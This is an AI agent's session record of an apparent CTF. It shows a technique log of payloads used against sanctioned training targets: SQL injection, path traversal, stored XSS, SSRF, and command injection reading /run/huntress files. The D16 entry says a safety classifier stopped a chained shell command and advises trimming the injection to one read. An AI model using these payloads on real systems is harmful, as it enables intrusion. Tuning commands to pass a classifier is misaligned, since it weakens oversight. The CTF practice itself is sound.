{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01K4uAh8tZzB2nJePdJiPyDF","type":"tool_result","content":"The file /home/testpwn/huntress-2026/reference/techniques/web.md has been updated successfully. (file state is current in your context — no need to Read it back)"}]},"parent_tool_use_id":null,"session_id":"2f22de87-85c6-4735-9cd3-ecbd50af08de","uuid":"be355746-3ef6-46fb-93cc-7c2ee2ae0475","timestamp":"2026-10-25T13:10:01.470Z","tool_use_result":{"type":"update","filePath":"/home/testpwn/huntress-2026/reference/techniques/web.md","content":"# web — technique log (lane-days D01-D18 released; updated after every day)\n\nHow the lane has looked so far (observations, not guarantees):\n- **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,\n  22 D09-D10, 23 D11-D13, 24 D14-D15, 25 D16-D18 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the\n  title but not always: D07 \"Stored for Later\" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`,\n  so lane-day != folder day). D19-D31 = 13 left for cal. 26-31 (~2-3 per day). Each lane-day = ONE classic bug,\n  named by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me\n  This\", D04 path traversal \"Stay in Your Directory\", D05 missing function-level authz \"Administratively Speaking\",\n  D06 reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for Later\", D08 session fixation \"Session\n  Impression\", D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading Expectations\", D11 SSTI \"Template\n  Temper\", D12 second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too Much\", D14 per-field/action API\n  authz \"The API Has Opinions\", D15 SSRF \"Fetch Quest\", D16 OS command injection \"Shell Company\", D17 password-reset\n  token not bound to the account \"Reset Expectations\", D18 GraphQL resolver missing field-level authz \"Resolver\n  Revolt\". Arc: info-disclosure -> access control -> injection -> file read -> XSS x2 -> session -> CSRF -> upload ->\n  SSTI -> second-order SQLi -> OWASP API run (mass assignment, BFLA/BOPLA, SSRF) -> cmd injection -> auth flow\n  (reset) -> GraphQL. Many days are \"one level deeper\" sequels (D10->D11, D03->D12, D05->D13->D14, D14->D18: same\n  `protected_reference` + case/note shape, now behind a GraphQL resolver).\n- **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",\n  \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After\n  CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle.\n- **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.\n  Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug.\n- **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security\n  boundary\"; framework banner = costume). `GET /api/clues` names the routes (`feature_route: /<word>-<hex6>`, often\n  `secondary_route`), `current_role: analyst` (D18: `current_user: analyst`, no `framework` key -- banner only in the\n  page title), plus ZERO or ONE concept key (`session_hint`, `callback_nonce`, `moderator_data_route`,\n  `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+`upload_policy`+`upload_shape`, D14\n  `inventory_route`+`protected_reference`, D16 `input_parameter`+`example_path`, D17 `recovery_guide_route`, D18\n  `protected_reference`+`note`). D11-D13, D15 had NO concept key: prompt + bare-route errors are the routing signal.\n  Bare routes answer JSON errors naming the missing piece (`session_id_required`, `authenticated_login_required`,\n  `browser_callback_required`, `post_required` (405), `administrator_required` (403), `internal_only` (403),\n  `absolute_url_required` (400), `fetch_failed`, `id_fields_action_required`, `field_action_forbidden`,\n  `path_required` (+`example_path`), `account_id_required`, `self_service_only`, `token_and_account_id_required`;\n  a GraphQL route answers GET with 404 `not_found`). Success = proof regex in `evidence`, `rows[]`, `stdout`, a\n  GraphQL `data` field, or a rendered page.\n- **The runtime config is readable.** Any file-read primitive (D16 `cat /run/huntress/*`) also shows\n  `/run/huntress/config.json`: `{\"schema\":\"huntress.web_exploitation.runtime_config.v1\",\"profile_id\":\"framework_go_gin_\n  command_injection\",\"weakness\":\"os_command_injection\",\"mode\":\"time_trial\",...}` -- it NAMES the class. Use it to\n  classify an unknown Mastery target once any read works.\n- **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers\n  + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.\n- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, 4 since D15); the\n  prompt describes only today's bug. `preparing` 4-25 s (D12/D13 Mastery ~3 min). With a handler on disk every\n  Mastery since D14 answered all targets in 3-6 s solve.\n- **A new class beats the generic seed unless the handler ships before TT.** TT `solver_incomplete` on D09, D10, D12,\n  D13, D15 and ALL THREE of D16-D18 (codify plugins landed 13:01:08-10Z, TT started 13:01:10Z; the D16 plugin was\n  still a `.tmp` when Mastery ran -> 3/4 answered, today's target hand-solved). Live workers rescue it in 30-55 s.\n\n## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)\n- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-4 (Mastery). Rule: map question\n  `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts.\n- **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on\n  every target (home, robots, /api/clues, /openapi.json), hinted probes first, the rest staged; targets in threads.\n  Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).\n- **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |\n  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`; fixed\n  paths `/preferences` (D09), `/api/inventory` (D14), `/api/recovery` (D17). Re-dealt within a day: D12 result ->\n  internal, D13 audit -> internal, D15 account -> internal, D16 process -> execute, D17 result -> audit, D18 inspect\n  -> submit. Rule: pick routes by clue KEY role (or the guide JSON's `*_route` keys), never by the word in the value.\n- **Clue key set**: concept key (D06-D10, D14, D16-D18) | only feature+secondary (D12, D13, D15) | only feature (D05,\n  D11). D18 swapped `current_role` -> `current_user` and dropped `framework`. Rule: no concept key -> classify from\n  prompt + bare GET of each route; a key shared by two classes (`protected_reference`: D14 with `inventory_route`,\n  D18 with `note`) -> route on the companion key, or race both handlers.\n- **Framework costume** (never changes the exploit): Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS,\n  Jakarta Servlet, ASP.NET Core, Gin (D16), Symfony (D17), GraphQL.js (D18, title only). Rule: ignore it -- except\n  that a Go server drops a raw `;` from the query string (percent-encode).\n- **Request body encoding (D12, D13)**: POST routes accept form AND JSON but only JSON binds. Rule: JSON first.\n- **Earlier classes (one line each)**: D01 robots `Disallow: /snapshots-<hex>/` | `/deploy-<hex5>/` -> `.json.bak`\n  (depth-2 crawl). D02 foreign ids in `/api/history`. D03 `('%..%')` wrapper -> tautology ladder over `'` `')` `'))`\n  `\"` + `--`/`#`. D04 every param holding `.`/`/` x `../`*10 + prompt path. D05 GET then POST every clue route. D07\n  board noun `messages` | `postcards` from openapi. D09 outside mailbox option `review-NNNN@outside.example.invalid`,\n  token sent or not. D10 preview URL from the upload response's `path`, syntax from the guide's `<code>`.\n- **SSTI (D11)**: param `template` (others rendered empty); `{{..}}` evaluated, `${..}`/`*{..}` literal under a\n  \"Spring Boot\" costume; context var `objective`. Rule: one probe per param holding every delimiter family with\n  distinct arithmetic, keep the family that evaluated, then ask for `objective`.\n- **Second-order SQLi (D12)**: `x' OR '1'='1' -- ` (single), `zz' OR 1=1 --` (TT) as JSON in every common field;\n  re-GET `secondary_route` after EACH plant. **Mass assignment (D13)**: one JSON body `display_name` + `role`,\n  `is_admin`, `isAdmin`, `admin`, `roles`, `access_level`, `permissions`; echo hides which bound.\n- **API field/action authz (D14)**: inventory `fields` `[title, note]`, `actions` `[view, export]`; single pair\n  (`note`+`export`) skips the check; lists and `*` forbidden. Rule: every SINGLE field x action from the inventory.\n- **SSRF (D15)**: `feature?url=http://127.0.0.1:8080<secondary>` in single, TT, Mastery; port 80/5000/8000/3000 =\n  `fetch_failed`. Rule: host ladder, port ladder, param from the error word, else `url`.\n- **Command injection (D16)**: `input_parameter: path` and `example_path: /app/static` constant across single, TT,\n  Mastery; base command `ls -ld <path>` (stdout echoed). Rule: param from `input_parameter` (else the `<x>_required`\n  error), value = example + `%3B` + `cat /run/huntress/objective.txt` (then `\\n`, `&&`, `|`, `$()`).\n- **Password reset (D17)**: guide JSON `{request_route, redeem_route, account_parameter: account_id,\n  token_parameter: token, accounts:[{id,label,self_service}]}` same keys in single/TT; ids, token (12 hex) and route\n  words differ. Rule: request a token for the `self_service:true` id, redeem it with each `self_service:false` id.\n- **GraphQL resolver (D18)**: schema identical in single/TT/Mastery (`caseIndex:[CaseReference{id,title,\n  visibility}]`, `case(id:ID!):Case{id,title,note}`); `protected_reference` is a STRING id. Rule: introspect, then\n  call every arg-taking Query field with the protected id selecting all scalars; POST JSON first, then GET\n  `?query=`, then form (\"vary the protocol surface\" -- POST JSON was enough every time).\n- **Proof carrier**: HTML text / `<pre>`, JSON `support_note` | `note` | `evidence` | `rows[]` | `stdout`, GraphQL\n  `data.<alias>.note`, a receipt on a board page. Rule: regex `proof_[0-9a-f]{32}` over every body -- never key on\n  field names or on `effect`.\n\n## Recognition cues -> first move\n- `targets[]` -> `curl --max-time 20 -sS -A 'Mozilla/5.0' -i <url>` (hook blocks curl without `--max-time`;\n  Cloudflare 403'd urllib's default UA), then `/robots.txt`, `/api/clues`, `/openapi.json`, `/sitemap.xml`.\n- Read /api/clues FIRST and call each route bare: the JSON error names the missing piece. No concept key -> the\n  prompt's verb names the bug. Any `*_guide_route` / `inventory_route` is a JSON map of the next requests: read it.\n- `Disallow:` -> D01 crawl. \"Signed in as\" + `/<things>/<id>` -> D02 IDOR. Search / \"database\" -> D03 tautology.\n  `?doc=` + \"stay inside\" -> D04 traversal. \"staff-only door, just a sign\" -> D05 GET it.\n- \"repeats everything\", `callback_nonce` -> D06 reflect + same-origin fetch-metadata callback. \"guestbook\",\n  `moderator_data_route` -> D07 stored script for the bot; poll. \"plant your session\", `session_hint` -> D08 `?sid=`.\n- \"obeys whoever asks nicely -- even strangers\", hidden `csrf_token` -> D09 cross-site form submit. \"upload form has\n  standards. Low ones\", `upload_shape` -> D10 `.html` with `{{objective}}`. \"evaluates everything\", empty\n  \"Rendered message\" `<pre>` -> D11 `?template={{objective}}`. \"plant ... come back later\", `post_required` +\n  `{\"rows\":[]}` -> D12 JSON plant then GET secondary. \"binds whatever you hand it\", `administrator_required` -> D13\n  privilege keys in one JSON body. `inventory_route` + `protected_reference` -> D14 field x action grid.\n  `absolute_url_required` + `internal_only` -> D15 `?url=http://127.0.0.1:8080<secondary>`.\n- \"a little too close to a real shell\", \"give it something to do\", clues `input_parameter` + `example_path`, bare\n  feature 400 `path_required` -> D16: `curl -G \"$U<feature>\" --data-urlencode \"path=/app/static;cat\n  /run/huntress/objective.txt\"` -> `stdout` gains the proof (effect `worker_command_completed` shows on the baseline\n  too).\n- \"Forgot your password? ... wake up in somebody else's account\", clue `recovery_guide_route` -> D17: GET the guide,\n  `GET <request_route>?account_id=<self_service id>` -> `{\"token\":...}`, then `GET <redeem_route>?token=<it>&\n  account_id=<other id>` -> `effect: synthetic_account_recovery` + `evidence`.\n- \"Discover the schema\", \"resolver\", \"field-level control\", clues `protected_reference` + `note` (\"field access is\n  checked by each resolver\"), feature GET 404 `not_found` -> D18 GraphQL: POST JSON `{\"query\":\"{__schema{...}}\"}`,\n  then `{caseIndex{id title visibility} case(id:\"<protected>\"){id title note}}` -> `note` = proof.\n- Proof regex hit = landed; an `effect` alone is NOT (D12 empty rows; D16 baseline already says completed).\n\n## Day by day\n- **D01-D05 (cal. 19-20)**: D01 robots Disallow -> index -> `.json.bak` `support_note`. D02 `/api/history` foreign\n  id -> `GET /api/briefs/<id>`. D03 `/lookup?q=zz') OR 1=1 --`. D04 `reader.php?doc=../`*6+`run/huntress/\n  objective.txt`. D05 GET `/dispatch-<hex6>` -> `framework_authorization_bypassed`. 47-51 s each.\n- **D06-D08 (cal. 21)**: D06 reflect `fetch('<cb>?nonce=N')` via `?q=`, then GET the callback with `Sec-Fetch-Site:\n  same-origin`/`Mode: cors`/`Dest: empty` + Referer; 83 s. D07 stored `<script>` fetches the data route and POSTs\n  `{evidence}` to the receipt route; poll (receipt >12 s in Mastery); 78 s. D08 `?sid=<hint>` -> `arena_session`\n  cookie -> GET secondary; 116 s (Mastery ~15 min: every solver raced on every target starved the app).\n- **D09-D10 (cal. 22)**: D09 CSRF judged by fetch-metadata: submit the outside mailbox with `Sec-Fetch-Site:\n  cross-site`, `Mode: navigate`, foreign Referer -> `changed_across_sites:true`; 70 s. D10 upload JSON `{filename:\n  \"note.html\", content:\"<p>{{objective}}</p>\", content_type:\"text/html\"}` -> GET returned `path`; 58 s.\n- **D11-D13 (cal. 23)**: D11 SSTI `?template={{objective}}` (105 s, plugin before submit -> TT first try). D12 JSON\n  plant `x' OR '1'='1' -- ` -> GET secondary `rows[]` (83 s). D13 JSON `display_name` + privilege keys -> GET\n  secondary `bound_privileged_property` (59 s).\n- **D14-D15 (cal. 24)**: D14 inventory -> `?id=<protected>&fields=note&action=export` ->\n  `api_field_action_authorization_bypassed` (75 s; TT/Mastery first try). D15 SSRF `?url=http://127.0.0.1:8080\n  <secondary>` -> `internal_service_reached` (75 s; TT `solver_incomplete`, plugin landed ~1 min late).\n- **D16 Shell Company (cal. 25)** -- OS command injection. Clues `{framework: \"Gin\", feature_route:\n  /process-<hex6> | /execute-<hex6>, input_parameter: \"path\", example_path: \"/app/static\", current_role}` (app\n  \"Command Counter\"). Bare -> 400 `{\"error\":\"path_required\",\"example_path\":\"/app/static\"}`; `?path=/app/static` ->\n  `{\"ok\":true,\"effect\":\"worker_command_completed\",\"stdout\":\"drwxr-xr-x ... /app/static\"}` (`ls -ld`). Raw\n  `?path=/app/static;id` -> `path_required` again (Go drops a query with a bare `;`); `%3B` works:\n  `?path=/app/static%3Bcat%20/run/huntress/objective.txt` -> stdout line 2 = proof. Single CORRECT ~40 s. TT\n  `solver_incomplete` (13.8 s, no plugin yet), live worker hand-solved in 31 s; Mastery 4 targets: 3 earlier\n  classes answered, today's missed (plugin file still `.tmp`), live worker solved it. A live turn that chained\n  `ls -la; cat /run/huntress/*` in a shell function was stopped by a safety classifier -- keep the injection to\n  one plain read of the objective file.\n- **D17 Reset Expectations (cal. 25)** -- password reset token not bound to the account it was issued for. Clues\n  `{framework: \"Symfony\", feature_route: /submit-<hex6>, secondary_route: /result-<hex6> | /audit-<hex6>,\n  recovery_guide_route: \"/api/recovery\", current_role}`. Guide -> `{request_route, redeem_route, account_parameter:\n  \"account_id\", token_parameter: \"token\", accounts:[{id, label:\"Your analyst account\", self_service:true}, {id,\n  label:\"Executive account\", self_service:false}]}`. Request for the victim -> `self_service_only`; request for self\n  -> `{\"ok\":true,\"account_id\":..,\"token\":\"<12 hex>\",\"redeem_route\":..}`; redeem `?token=<own>&account_id=<victim>`\n  -> `{\"ok\":true,\"effect\":\"synthetic_account_recovery\",\"account_id\":<victim>,\"evidence\":\"proof_...\"}`. Single\n  ~39 s; TT `solver_incomplete` (21 s) then hand-solved (52 s); Mastery 4 targets first try, 17 s total.\n- **D18 Resolver Revolt (cal. 25)** -- GraphQL resolver skipping its field-level check. Clues `{current_user:\n  \"analyst\", feature_route: /inspect-<hex6> | /submit-<hex6>, protected_reference: \"<int as string>\", note: \"The case\n  index lists references; field access is checked by each resolver.\"}`; page title \"Graph Garden · GraphQL.js\".\n  GET feature -> 404 `not_found` (do not conclude dead); POST JSON introspection works -> `Query{caseIndex, case(id:\n  ID!)}`, `Case{id,title,note}`, `CaseReference{id,title,visibility}` (protected row `visibility: \"reference\n  only\"`). `{caseIndex{id title visibility} case(id:\"<protected>\"){id title note}}` -> `note` = proof. Single\n  CORRECT ~36 s; TT `solver_incomplete` (22 s) then hand-solved (53 s); Mastery 4 targets first try, 14 s total.\n\n## GM answer conventions learned\n- Answer = bare `proof_<32 lowercase hex>` (the CORRECT body's `flag` is a different value; never submit it). `trim`.\n  Ids `proof-1`..`proof-N` in target order. Batch all Mastery proofs in one submit; partial = `accepted`+`remaining`\n  (D16 Mastery: 3 accepted, `remaining: 1`, then proof-4 alone -> CORRECT).\n- `effect` spellings confirmed: `framework_authorization_bypassed` (D05), `isolated_browser_callback` (D06),\n  `fixed_session_privilege_transfer` (D08), `delayed_query_revealed_private_row` (D12), `bound_privileged_property`\n  (D13), `api_field_action_authorization_bypassed` (D14), `internal_service_reached` (D15),\n  `worker_command_completed` (D16, also on the harmless baseline), `synthetic_account_recovery` (D17); D18 none\n  (plain GraphQL `data`). D09 `changed_across_sites:true`; D10, D11 rendered HTML; D07 a moderator receipt.\n- `already_solved` after CORRECT is harmless; a 503 `temporarily_unavailable` on submit may still have landed.\n\n## Pitfalls that cost time\n- Shipping a new day without its class handler: TT `solver_incomplete` on D09, D10, D12, D13, D15, D16, D17, D18,\n  and D16 Mastery missed today's target. Write `lib/web/handlers/dayNN_*.py` (KEY_MAP + HANDLERS) BEFORE the single\n  submit, like D11 did; the single solves now take ~40 s, so the plugin is the long pole.\n- Treating `effect` as success: D12 prints its effect with `rows: []`; D16 prints `worker_command_completed` for\n  the plain `ls`. Success = proof regex.\n- Raw `;` in a Go (Gin) query string is dropped -> the param looks missing. Always `--data-urlencode` / `%3B`.\n- GraphQL routes 404 on GET; POST JSON `{\"query\":...}` before writing the route off.\n- Form-encoded bodies on JSON APIs: D12 ignored form fields (but answered `saved:true`). Send JSON first.\n- Trusting the echo: D13 echoes only `display_name`; bound privileges are invisible until the secondary route.\n- SSRF to the default port: D15's internal service listens on 8080; `fetch_failed` = wrong port, not \"blocked\".\n- Combining fields (`title,note`, `*`) in D14 was forbidden; only the single bypassed pair works.\n- A 500 on `{{unknown}}` (D11 Spring JSON) means \"undefined variable\", not \"not injectable\".\n- Choosing routes by the WORD in a clue value (re-dealt every attempt) or by prompt keywords in Mastery. One-level\n  crawls (D01). Solvers importing each other's `fallback()`. Hammering one target with every probe in parallel.\n- Polling a bot-driven receipt for a fixed 12 s: the D07 moderator sometimes comes later.\n- Live cases can't be replayed after CORRECT (410). Save target responses during the solve; never hard-code proofs.\n- Trusting the app's stated policy (\"txt only\", \"token required\", \"self-service only\" on REQUEST but not REDEEM).\n- `curl` without `--max-time` is blocked by the hook; urllib's default UA can draw a Cloudflare 403.\n\n## reviewer cross-check (measured on a parallel agent; folded into the drivers)\n- **Blind SQLi oracle trap (D03).** `q` sits in an EVEN number of `col LIKE '%q%'` clauses, so `' OR '1'='1` and\n  `' OR '1'='2` BOTH return all rows. Oracle = quote balance: `nope' OR (<cond>) OR '1'='2` reduces WHERE to\n  `<cond>`; calibrate on `1=1`/`1=2`. SQLite; `summary LIKE char(112,114,111,111,102,37)` spells `'proof%'`.\n- **LFI.** The `?doc=` viewer silently returns the NORMAL page for depth 1-2; use >= 3 `../` into the prompt path.\n- **`control_unavailable` is TRANSIENT** (a 26.7 s hang on `op=start`; resend succeeded). Back off and re-send.\n","structuredPatch":[{"oldStart":1,"oldLines":196,"newStart":1,"newLines":199,"lines":["-# web — technique log (lane-days D01-D15 released; updated after every day)","+# web — technique log (lane-days D01-D18 released; updated after every day)"," "," How the lane has looked so far (observations, not guarantees):"," - **Late release, catch-up pace.** No web on calendar days 1-18. Cal. 19 released D01-D03, 20 D04-D05, 21 D06-D08,","-  22 D09-D10, 23 D11-D13, 24 D14-D15 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the title but not always: D07","-  \"Stored for Later\" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`, so lane-day != folder day).","-  Expect ~2-3 lane-days per calendar day (D16-D31 = 16 left for cal. 25-31). Each lane-day = ONE classic bug, named","-  by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me This\",","-  D04 path traversal \"Stay in Your Directory\", D05 missing function-level authz \"Administratively Speaking\", D06","-  reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for Later\", D08 session fixation \"Session Impression\",","-  D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading Expectations\", D11 SSTI \"Template Temper\", D12","-  second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too Much\", D14 per-field/action API authz (BFLA/","-  BOPLA) \"The API Has Opinions\", D15 SSRF \"Fetch Quest\". Arc: info-disclosure -> access control -> injection -> file","-  read -> access control -> XSS x2 -> session -> CSRF -> upload -> SSTI -> second-order SQLi -> mass assignment ->","-  API field/action authz -> SSRF (server-side / API turn since D10; D13-D14 = OWASP API Top 10 items; many days are","-  \"one level deeper\" sequels of earlier ones: D10->D11, D03->D12, D05->D13->D14).","+  22 D09-D10, 23 D11-D13, 24 D14-D15, 25 D16-D18 (GM ids `web-exploitation-day-NN-<slug>`; the slug is usually the","+  title but not always: D07 \"Stored for Later\" = `...-day-07-stored-xss`; folder `challenges/<cal-day>/web-<title>`,","+  so lane-day != folder day). D19-D31 = 13 left for cal. 26-31 (~2-3 per day). Each lane-day = ONE classic bug,","+  named by a title pun: D01 backup exposure \"Back Up a Minute\", D02 IDOR \"Permission to Slip\", D03 SQLi \"Query Me","+  This\", D04 path traversal \"Stay in Your Directory\", D05 missing function-level authz \"Administratively Speaking\",","+  D06 reflected XSS \"Reflect Upon This\", D07 stored XSS \"Stored for Later\", D08 session fixation \"Session","+  Impression\", D09 CSRF \"Forged With Care\", D10 unrestricted upload \"Uploading Expectations\", D11 SSTI \"Template","+  Temper\", D12 second-order SQLi \"Ask Again Later\", D13 mass assignment \"Posted Too Much\", D14 per-field/action API","+  authz \"The API Has Opinions\", D15 SSRF \"Fetch Quest\", D16 OS command injection \"Shell Company\", D17 password-reset","+  token not bound to the account \"Reset Expectations\", D18 GraphQL resolver missing field-level authz \"Resolver","+  Revolt\". Arc: info-disclosure -> access control -> injection -> file read -> XSS x2 -> session -> CSRF -> upload ->","+  SSTI -> second-order SQLi -> OWASP API run (mass assignment, BFLA/BOPLA, SSRF) -> cmd injection -> auth flow","+  (reset) -> GraphQL. Many days are \"one level deeper\" sequels (D10->D11, D03->D12, D05->D13->D14, D14->D18: same","+  `protected_reference` + case/note shape, now behind a GraphQL resolver)."," - **No artifact: a live target.** `start` returns `result: preparing` until ready, then `targets: [{\"id\": \"Target N\",","   \"url\": \"https://<48hex>.2026.huntress.ctf.games/\"}]`. Reachable directly from the host, behind Cloudflare. After","   CORRECT every path returns `410 {\"state\":\"completed\"}`; an untimed target stops after 30 min idle."," - **Contract is fixed:** `proof-N` \"Recover the proof from Target N.\", artifact `Target N`, `exact_text`, `trim`.","   Answer = token `proof_<32 lowercase hex>` printed by the app. The prompt (one or two sentences) names the bug."," - **Since D05 every app is the same kit** (\"A small, complete training app with one deliberately isolated security","-  boundary\"; framework banner = costume: Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS). `GET","-  /api/clues` names everything: `framework`, `feature_route: /<word>-<hex6>`, usually `secondary_route:","-  /<word>-<hex6>`, `current_role: analyst`, plus ZERO or ONE concept key (`session_hint`, `callback_nonce`,","-  `moderator_data_route`, `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+","-  `upload_policy`+`upload_shape`, D14 `inventory_route`+`protected_reference`). D11-D13, D15 had NO concept key (D11 not even `secondary_route`): the prompt + the","-  bare-route errors are then the only routing signal. Routes answer JSON errors that say what is missing","-  (`session_id_required`, `authenticated_login_required`, `browser_callback_required`, `signed_in_session_required`,","-  `invalid_destination`, `method_not_allowed`, `file_not_found`, `post_required` (405), `administrator_required`","-  (403), `internal_only` (403), `absolute_url_required` (400), `fetch_failed`, `id_fields_action_required`,","-  `field_action_forbidden`). Success = `{\"ok\":true,\"effect\":\"<snake_case>\",\"evidence\":\"proof_...\"}`, a concept-shaped JSON carrying the","-  proof (`evidence`, `rows[]`), or the proof inline in a rendered page (D10, D11).","+  boundary\"; framework banner = costume). `GET /api/clues` names the routes (`feature_route: /<word>-<hex6>`, often","+  `secondary_route`), `current_role: analyst` (D18: `current_user: analyst`, no `framework` key -- banner only in the","+  page title), plus ZERO or ONE concept key (`session_hint`, `callback_nonce`, `moderator_data_route`,","+  `receipt_route_template`, `preferences_route`, `render_route`+`preview_guide`+`upload_policy`+`upload_shape`, D14","+  `inventory_route`+`protected_reference`, D16 `input_parameter`+`example_path`, D17 `recovery_guide_route`, D18","+  `protected_reference`+`note`). D11-D13, D15 had NO concept key: prompt + bare-route errors are the routing signal.","+  Bare routes answer JSON errors naming the missing piece (`session_id_required`, `authenticated_login_required`,","+  `browser_callback_required`, `post_required` (405), `administrator_required` (403), `internal_only` (403),","+  `absolute_url_required` (400), `fetch_failed`, `id_fields_action_required`, `field_action_forbidden`,","+  `path_required` (+`example_path`), `account_id_required`, `self_service_only`, `token_and_account_id_required`;","+  a GraphQL route answers GET with 404 `not_found`). Success = proof regex in `evidence`, `rows[]`, `stdout`, a","+  GraphQL `data` field, or a rendered page.","+- **The runtime config is readable.** Any file-read primitive (D16 `cat /run/huntress/*`) also shows","+  `/run/huntress/config.json`: `{\"schema\":\"huntress.web_exploitation.runtime_config.v1\",\"profile_id\":\"framework_go_gin_","+  command_injection\",\"weakness\":\"os_command_injection\",\"mode\":\"time_trial\",...}` -- it NAMES the class. Use it to","+  classify an unknown Mastery target once any read works."," - **\"Browser\" checks are of two kinds.** D06 and D09: NO real browser -- the server judges by fetch-metadata headers","   + Referer. D07: a REAL moderator bot visits stored content seconds (sometimes >12 s) later. Try headers first.","-- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, **4 on D15**); the","-  prompt describes only today's bug. Earlier bugs seen in Mastery so far: D01 (x3), D02 (x2), D04, D05 (D11-D13 composition","-  not logged: the solver answered all targets in 3-6 s). Mastery `preparing` varies: D12 189 s, D13 175 s, D11 7.5 s,","-  D14 17 s, D15 18 s; singles / TT 4-25 s.","-- **A new class beats the generic seed unless the handler ships before TT.** D09, D10, D12, D13, D15 TT all came back","-  `solver_incomplete` (13-41 s): solve.py had no handler for the new class. D15: TT started 13:18:04Z, the","-  `day24_web_fetch_quest.py` plugin landed ~1 min later -> live worker hand-solved. D11 (plugin written BEFORE the","-  single submit) and D14 went first try. The orchestrator starts TT ~5-30 s after single CORRECT.","+- **Mastery = today's bug + earlier lane-days on extra targets** (2 targets D03-D07, 3 since D08, 4 since D15); the","+  prompt describes only today's bug. `preparing` 4-25 s (D12/D13 Mastery ~3 min). With a handler on disk every","+  Mastery since D14 answered all targets in 3-6 s solve.","+- **A new class beats the generic seed unless the handler ships before TT.** TT `solver_incomplete` on D09, D10, D12,","+  D13, D15 and ALL THREE of D16-D18 (codify plugins landed 13:01:08-10Z, TT started 13:01:10Z; the D16 plugin was","+  still a `.tmp` when Mastery ran -> 3/4 answered, today's target hand-solved). Live workers rescue it in 30-55 s."," "," ## Variant axes (what differs between single, Time Trial and Mastery -- parse every value listed)","-- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-3 (Mastery). Rule: map question","+- **Target host / count**: random 48-hex host per attempt; 1 target (single, TT), 2-4 (Mastery). Rule: map question","   `artifact` \"Target N\" to `targets[].id`, fallback Nth entry; never reuse a URL across attempts."," - **Mastery composition / order**: earlier-day targets at any index; prompt is today's only. Rule: cheap recon on","-  every target (home, robots, /api/clues, /openapi.json), run the probes the recon hints first, the rest staged;","-  targets in threads. Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other).","+  every target (home, robots, /api/clues, /openapi.json), hinted probes first, the rest staged; targets in threads.","+  Import earlier solvers' `answer()` ONLY (day-21 `fallback()`s recurse into each other)."," - **Clue route words** (`/<word>-<hex6>`): feature `dispatch` | `execute` | `process` | `action` | `submit` |","-  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`; render","-  (D10) `account` | `internal` | `result`; fixed paths `/preferences` (D09), `/api/inventory` (D14). Within one day:","-  D12 secondary `result` -> `internal`; D13 `audit` -> `internal`; D15 `account` -> `internal` (feature `action` both).","-  Rule: pick routes by clue KEY role (`feature_route`, `secondary_route`, `*_data_route`, `*_template`,","-  `inventory_route`), never by the word in the value.","-- **Clue key set**: with a concept key (D06-D10, D14) | only `feature_route`+`secondary_route` (D12, D13, D15) | only","-  `feature_route` (D05, D11). Rule: no concept key -> classify from the prompt + bare GET of each route (`post_required`","-  = a POST sink; 403 `administrator_required` = privilege check; HTML `<pre>` echo = render sink; 400","-  `absolute_url_required` on feature + 403 `internal_only` on secondary = SSRF pair).","+  `inspect`; secondary `callback` | `internal` | `status` | `result` | `audit` | `account` | `staff-<hex8>`; fixed","+  paths `/preferences` (D09), `/api/inventory` (D14), `/api/recovery` (D17). Re-dealt within a day: D12 result ->","+  internal, D13 audit -> internal, D15 account -> internal, D16 process -> execute, D17 result -> audit, D18 inspect","+  -> submit. Rule: pick routes by clue KEY role (or the guide JSON's `*_route` keys), never by the word in the value.","+- **Clue key set**: concept key (D06-D10, D14, D16-D18) | only feature+secondary (D12, D13, D15) | only feature (D05,","+  D11). D18 swapped `current_role` -> `current_user` and dropped `framework`. Rule: no concept key -> classify from","+  prompt + bare GET of each route; a key shared by two classes (`protected_reference`: D14 with `inventory_route`,","+  D18 with `note`) -> route on the companion key, or race both handlers."," - **Framework costume** (never changes the exploit): Django, Laravel, Node, FastAPI, Spring Boot, Sinatra, NestJS,","-  \"Jakarta Servlet on Tomcat\" (D14), \"ASP.NET Core 